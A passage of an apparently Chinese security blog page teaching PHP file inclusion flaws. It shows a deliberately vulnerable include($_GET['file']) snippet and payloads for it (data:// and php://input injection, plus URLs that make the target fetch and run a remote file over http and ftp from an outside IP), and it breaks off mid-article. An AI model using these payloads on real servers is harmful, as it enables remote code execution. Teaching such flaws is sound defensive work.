@@ -1,0 +1,1065 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>PHP安全之文件包含漏洞 | UltramanGaia&#39;s Blog</title>
+  <meta name="keywords" content=" PHP ">
+  <meta name="description" content="PHP安全之文件包含漏洞 | UltramanGaia&#39;s Blog">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta property="og:type" content="website">
+<meta property="og:title" content="categories">
+<meta property="og:url" content="http://ultramangaia.github.io/categories/index.html">
+<meta property="og:site_name" content="UltramanGaia&#39;s Blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2017-12-23T08:37:16.000Z">
+<meta property="article:modified_time" content="2019-01-19T16:10:04.947Z">
+<meta property="article:author" content="UltramanGaia">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/sublime.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+</div>
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/avatar.jpg" />
+</a>
+<div class="author">
+    <span>UltramanGaia</span>
+</div>
+
+<div class="icon">
+    
+        
+        <a title="rss" href="/atom.xml" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-rss"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="github" href="https://github.com/UltramanGaia" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-github"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+    
+        
+        <a title="email" href="mailto:3213359017@qq.com" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-email"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=3213359017&site=qq&menu=yes" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-qq"></use>
+                </svg>
+            
+        </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li><div class="all active" data-rel="全部文章">全部文章<small>(35)</small></div></li>
+    
+        
+            
+            <li><div data-rel="Web"><i class="fold iconfont icon-right"></i>Web<small>(26)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="Web<--->Web安全">Web安全<small>(7)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Web<--->Writeup">Writeup<small>(14)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Web<--->漏洞挖掘">漏洞挖掘<small>(5)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="Java"><i class="fold iconfont icon-right"></i>Java<small>(1)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="Java<--->Java安全">Java安全<small>(1)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="PHP"><i class="fold iconfont icon-right"></i>PHP<small>(4)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="PHP<--->PHP安全">PHP安全<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="PHP<--->漏洞分析">漏洞分析<small>(3)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="其它"><i class="fold iconfont icon-right"></i>其它<small>(3)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="其它<--->智能合约">智能合约<small>(2)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="其它<--->机器学习">机器学习<small>(1)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+            <li><div data-rel="二进制"><i class="fold iconfont icon-right"></i>二进制<small>(1)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="二进制<--->PWN">PWN<small>(1)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    </div>
+    <div></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="35">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="https://ultramangaia.cn/">UltramanGaia</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">全部文章</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" />
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ctf</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Java</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>lua</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>PHP</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>PWN</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>SQL</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>sqlmap</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>stackoverflow</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ThinkPHP</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>writeup</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>XSS</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>XSSI</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>XXE</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ysoserial</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>代码执行</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>反序列化</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>命令注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件上传</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>智能合约</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>机器学习</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>漏洞分析</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>漏洞挖掘</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>请求走私</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a id="top" class="全部文章 Web 漏洞挖掘 "
+           href="/blog/2019/Xiaomi-Series-Router-Command-Execution-Vulnerability.html"
+           data-tag="漏洞挖掘,lua"
+           data-author="" >
+            <span class="post-title" title="小米系列路由器远程命令执行漏洞（CVE-2019-18370，CVE-2019-18371）">小米系列路由器远程命令执行漏洞（CVE-2019-18370，CVE-2019-18371）</span>
+            <span class="post-date" title="2019-03-09 14:41:12">2019/03/09</span>
+        </a>
+        
+        <a id="top" class="全部文章 Web 漏洞挖掘 "
+           href="/blog/2020/OpenResty%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E-CVE-2020-11724.html"
+           data-tag="请求走私"
+           data-author="" >
+            <span class="post-title" title="OpenResty请求走私漏洞（CVE-2020-11724）">OpenResty请求走私漏洞（CVE-2020-11724）</span>
+            <span class="post-date" title="2020-02-10 10:00:41">2020/02/10</span>
+        </a>
+        
+        <a id="top" class="全部文章 Web 漏洞挖掘 "
+           href="/blog/2020/WebswingJsLink%E6%9C%BA%E5%88%B6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2020-11103.html"
+           data-tag="代码执行"
+           data-author="" >
+            <span class="post-title" title="Webswing JsLink机制远程代码执行漏洞（CVE-2020-11103）">Webswing JsLink机制远程代码执行漏洞（CVE-2020-11103）</span>
+            <span class="post-date" title="2020-03-10 10:00:41">2020/03/10</span>
+        </a>
+        
+        <a  class="全部文章 Web 漏洞挖掘 "
+           href="/blog/2020/Webswing-JsLink-Mechanism-Remote-Code-Execution-Vulnerability-CVE-2020-11103.html"
+           data-tag="代码执行"
+           data-author="" >
+            <span class="post-title" title="Webswing JsLink Mechanism Remote Code Execution Vulnerability（CVE-2020-11103）">Webswing JsLink Mechanism Remote Code Execution Vulnerability（CVE-2020-11103）</span>
+            <span class="post-date" title="2020-03-10 10:00:41">2020/03/10</span>
+        </a>
+        
+        <a  class="全部文章 Web 漏洞挖掘 "
+           href="/blog/2020/OpenResty-Http-Request-Smuggling-Vulnerability-CVE-2020-11724.html"
+           data-tag="请求走私"
+           data-author="" >
+            <span class="post-title" title="OpenResty Http request smuggling Vulnerability（CVE-2020-11724）">OpenResty Http request smuggling Vulnerability（CVE-2020-11724）</span>
+            <span class="post-date" title="2020-02-10 10:00:41">2020/02/10</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8BXSSI%E6%BC%8F%E6%B4%9E.html"
+           data-tag="XSSI"
+           data-author="" >
+            <span class="post-title" title="Web安全之XSSI漏洞">Web安全之XSSI漏洞</span>
+            <span class="post-date" title="2018-10-18 16:25:02">2018/10/18</span>
+        </a>
+        
+        <a  class="全部文章 Java Java安全 "
+           href="/blog/2018/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html"
+           data-tag="Java,ysoserial,反序列化"
+           data-author="" >
+            <span class="post-title" title="Java反序列化漏洞">Java反序列化漏洞</span>
+            <span class="post-date" title="2018-10-18 16:25:02">2018/10/18</span>
+        </a>
+        
+        <a  class="全部文章 PHP 漏洞分析 "
+           href="/blog/2018/ThinkPHP-3-X-5-X-order-by%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"
+           data-tag="漏洞分析,ThinkPHP,SQL"
+           data-author="" >
+            <span class="post-title" title="ThinkPHP 3.X-5.X order by注入漏洞分析">ThinkPHP 3.X-5.X order by注入漏洞分析</span>
+            <span class="post-date" title="2018-09-14 10:00:41">2018/09/14</span>
+        </a>
+        
+        <a  class="全部文章 其它 智能合约 "
+           href="/blog/2018/Ethernaut%E9%9D%B6%E5%9C%BAwriteup.html"
+           data-tag="writeup,智能合约"
+           data-author="" >
+            <span class="post-title" title="Ethernaut 靶场 Writeup">Ethernaut 靶场 Writeup</span>
+            <span class="post-date" title="2018-06-01 18:12:04">2018/06/01</span>
+        </a>
+        
+        <a  class="全部文章 其它 智能合约 "
+           href="/blog/2018/0ctf-%E7%BA%BF%E4%B8%8B-misc-ZeroLottery.html"
+           data-tag="ctf,writeup,智能合约"
+           data-author="" >
+            <span class="post-title" title="0CTF 线下 Misc ZeroLottery Writeup">0CTF 线下 Misc ZeroLottery Writeup</span>
+            <span class="post-date" title="2018-05-29 19:10:40">2018/05/29</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/starctf-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="StarCTF 2018 Writeup">StarCTF 2018 Writeup</span>
+            <span class="post-date" title="2018-04-23 20:50:00">2018/04/23</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/ddctf-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="DDCTF 2018 Writeup">DDCTF 2018 Writeup</span>
+            <span class="post-date" title="2018-04-21 03:38:49">2018/04/21</span>
+        </a>
+        
+        <a  class="全部文章 PHP 漏洞分析 "
+           href="/blog/2018/DedeCMS5-7%E5%90%8E%E5%8F%B0%E4%B8%A4%E5%A4%84Getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"
+           data-tag="漏洞分析"
+           data-author="" >
+            <span class="post-title" title="DedeCMS 5.7 后台两处RCE漏洞分析">DedeCMS 5.7 后台两处RCE漏洞分析</span>
+            <span class="post-date" title="2018-04-15 20:50:27">2018/04/15</span>
+        </a>
+        
+        <a  class="全部文章 PHP 漏洞分析 "
+           href="/blog/2018/Drupal-Drupalgeddon-2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2018-7600.html"
+           data-tag="漏洞分析"
+           data-author="" >
+            <span class="post-title" title="Drupal Drupalgeddon 2远程代码执行漏洞分析">Drupal Drupalgeddon 2远程代码执行漏洞分析</span>
+            <span class="post-date" title="2018-04-15 01:37:57">2018/04/15</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html"
+           data-tag="命令注入"
+           data-author="" >
+            <span class="post-title" title="Web安全之命令注入漏洞">Web安全之命令注入漏洞</span>
+            <span class="post-date" title="2018-04-08 19:56:45">2018/04/08</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8BXXE%E6%BC%8F%E6%B4%9E.html"
+           data-tag="XXE"
+           data-author="" >
+            <span class="post-title" title="Web安全之XXE漏洞">Web安全之XXE漏洞</span>
+            <span class="post-date" title="2018-04-06 11:53:41">2018/04/06</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/0ctf-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="0CTF 2018 Writeup">0CTF 2018 Writeup</span>
+            <span class="post-date" title="2018-04-03 16:53:31">2018/04/03</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/%E5%BC%BA%E7%BD%91%E6%9D%AF-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="强网杯 CTF 2018 Writeup">强网杯 CTF 2018 Writeup</span>
+            <span class="post-date" title="2018-03-30 12:47:57">2018/03/30</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E6%BC%8F%E6%B4%9E.html"
+           data-tag="XSS"
+           data-author="" >
+            <span class="post-title" title="Web安全之XSS漏洞">Web安全之XSS漏洞</span>
+            <span class="post-date" title="2018-03-26 17:57:09">2018/03/26</span>
+        </a>
+        
+        <a  class="全部文章 二进制 PWN "
+           href="/blog/2018/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E.html"
+           data-tag="PWN,stackoverflow"
+           data-author="" >
+            <span class="post-title" title="二进制安全之栈溢出漏洞">二进制安全之栈溢出漏洞</span>
+            <span class="post-date" title="2018-03-26 00:51:47">2018/03/26</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/pragyan-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="Pragyan CTF 2018 Writeup">Pragyan CTF 2018 Writeup</span>
+            <span class="post-date" title="2018-03-03 00:48:28">2018/03/03</span>
+        </a>
+        
+        <a  class="全部文章 PHP PHP安全 "
+           href="/blog/2018/PHP%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.html"
+           data-tag="PHP"
+           data-author="" >
+            <span class="post-title" title="PHP安全之文件包含漏洞">PHP安全之文件包含漏洞</span>
+            <span class="post-date" title="2018-03-02 19:21:59">2018/03/02</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/Xiomara-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="Xiomara CTF 2018 Writeup">Xiomara CTF 2018 Writeup</span>
+            <span class="post-date" title="2018-02-28 20:23:22">2018/02/28</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html"
+           data-tag="SQL"
+           data-author="" >
+            <span class="post-title" title="Web安全之SQL注入漏洞">Web安全之SQL注入漏洞</span>
+            <span class="post-date" title="2018-02-23 13:57:25">2018/02/23</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html"
+           data-tag="文件上传"
+           data-author="" >
+            <span class="post-title" title="Web安全之文件上传漏洞">Web安全之文件上传漏洞</span>
+            <span class="post-date" title="2018-02-11 11:27:17">2018/02/11</span>
+        </a>
+        
+        <a  class="全部文章 其它 机器学习 "
+           href="/blog/2017/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0.html"
+           data-tag="机器学习"
+           data-author="" >
+            <span class="post-title" title="机器学习">机器学习</span>
+            <span class="post-date" title="2017-12-27 14:38:27">2017/12/27</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/DVWA-%E9%9D%B6%E5%9C%BA-writeup.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="DVWA 靶场 Writeup">DVWA 靶场 Writeup</span>
+            <span class="post-date" title="2017-12-05 20:00:04">2017/12/05</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/webug3-0-writeup.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="Webug3.0 靶场 Writeup">Webug3.0 靶场 Writeup</span>
+            <span class="post-date" title="2017-12-04 19:46:57">2017/12/04</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/%E5%BC%BA%E7%BD%91%E6%9D%AF-ctf-2017.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="强网杯 CTF 2017 Writeup">强网杯 CTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-27 19:36:03">2017/11/27</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/gctf-ctf-2017.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="GCTF 2017 Writeup">GCTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-27 19:31:56">2017/11/27</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/%E4%B8%96%E5%AE%89%E6%9D%AF-ctf-2017.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="世安杯 CTF 2017 Writeup">世安杯 CTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-27 19:21:19">2017/11/27</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/pwn2win-ctf-2017.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="Pwn2win CTF 2017 Writeup">Pwn2win CTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-27 19:11:00">2017/11/27</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/%E6%B9%96%E6%B9%98%E6%9D%AF-2017-ctf.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="湖湘杯 CTF 2017 Writeup">湖湘杯 CTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-25 19:42:32">2017/11/25</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/hitcon-ctf-2017.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="Hitcon CTF 2017 Writeup">Hitcon CTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-06 17:34:33">2017/11/06</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2017/%E7%BC%96%E5%86%99sqlmap-Tamper%E7%BB%95%E8%BF%87Waf.html"
+           data-tag="ctf,sqlmap"
+           data-author="" >
+            <span class="post-title" title="编写sqlmap Tamper绕过Waf">编写sqlmap Tamper绕过Waf</span>
+            <span class="post-date" title="2017-10-12 17:10:31">2017/10/12</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-PHP安全之文件包含漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">PHP安全之文件包含漏洞</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="PHP">PHP</a> > 
+            
+            <a  data-rel="PHP&lt;---&gt;PHP安全">PHP安全</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color4">PHP</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2020-07-16 01:04:08'>2018-03-02 19:21</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#完全控制文件名"><span class="toc-text">完全控制文件名</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#远程文件包含"><span class="toc-text">远程文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#GetShell"><span class="toc-text">GetShell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#data协议"><span class="toc-text">data协议</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#php-input（allow-url-open可以是off）"><span class="toc-text">php:&#x2F;&#x2F;input（allow_url_open可以是off）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#http协议-https协议"><span class="toc-text">http协议&#x2F;https协议</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ftp协议"><span class="toc-text">ftp协议</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LFI-本地文件包含"><span class="toc-text">LFI 本地文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#GetShell-1"><span class="toc-text">GetShell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#包含session"><span class="toc-text">包含session</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#包含上传文件"><span class="toc-text">包含上传文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#包含上传临时文件"><span class="toc-text">包含上传临时文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#包含-proc-self-environs"><span class="toc-text">包含&#x2F;proc&#x2F;self&#x2F;environs</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#包含日志文件"><span class="toc-text">包含日志文件</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#读取敏感文件"><span class="toc-text">读取敏感文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#限制文件名结尾部分"><span class="toc-text">限制文件名结尾部分</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#00截断"><span class="toc-text">%00截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#路径长度截断"><span class="toc-text">路径长度截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#点号截断："><span class="toc-text">点号截断：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#限制文件名开头部分"><span class="toc-text">限制文件名开头部分</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#回溯目录"><span class="toc-text">..&#x2F; 回溯目录</span></a></li></ol></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <pre><code>PHP在引入文件时，对传入的文件名没有进行恰当的校验</code></pre><h2 id="完全控制文件名"><a href="#完全控制文件名" class="headerlink" title="完全控制文件名"></a>完全控制文件名</h2><pre><code class="php">&lt;?php
+include($_GET[&#39;file&#39;]);
+?&gt;</code></pre>
+<p>完全控制文件名，可用的操作非常多。</p>
+<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><h4 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h4><blockquote>
+<p>要求allow_url_open=on(默认on) &amp;&amp; allow_url_include=on(PHP &lt; 5.30默认on，以后默认off) </p>
+</blockquote>
+<h5 id="data协议"><a href="#data协议" class="headerlink" title="data协议"></a>data协议</h5><pre><code class="html">http://myhack.com/index.php?file=data://text/plain,&lt;?php phpinfo();?&gt;
+http://myhack.com/index.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
+http://myhack.com/index.php?file=data:text/plain,&lt;?php phpinfo();?&gt;
+http://myhack.com/index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</code></pre>
+<h5 id="php-input（allow-url-open可以是off）"><a href="#php-input（allow-url-open可以是off）" class="headerlink" title="php://input（allow_url_open可以是off）"></a>php://input（allow_url_open可以是off）</h5><pre><code class="html">数据包
+POST /index.php?file=php://input HTTP/1.1
+Host: myhack.com
+content-type: application/x-www-form-urlencoded
+Content-Length: 18
+
+&lt;?php phpinfo();?&gt;</code></pre>
+<h5 id="http协议-https协议"><a href="#http协议-https协议" class="headerlink" title="http协议/https协议"></a>http协议/https协议</h5><pre><code>http://myhack.com/index.php?file=http://118.88.99.44/php.txt</code></pre><h5 id="ftp协议"><a href="#ftp协议" class="headerlink" title="ftp协议"></a>ftp协议</h5><pre><code>http://myhack.com/index.php?file=ftp://gaia:123456@118.88.99.44/php.txt
